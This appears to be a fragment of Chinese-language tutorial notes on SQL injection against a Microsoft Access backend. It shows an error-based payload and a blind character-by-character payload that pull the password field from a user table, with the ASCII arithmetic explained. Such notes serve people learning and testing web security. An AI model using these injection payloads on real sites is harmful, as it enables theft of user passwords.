需要报错

select \* from idea\_user where id=3+(dfirst(\[password\],(\[idea\_user\]!\[password\])))

  

![](../Images/afbb66928da06856c457c5347cd3907d.png)

盲注

select \* from idea\_user where id=3+asc(mid((dfirst("\[password\]","\[idea\_user\]")),1,1))-101

password字段第一个字符为e，对应ascii为101，所以id=3+101-101 还是等于3，页面返回正常
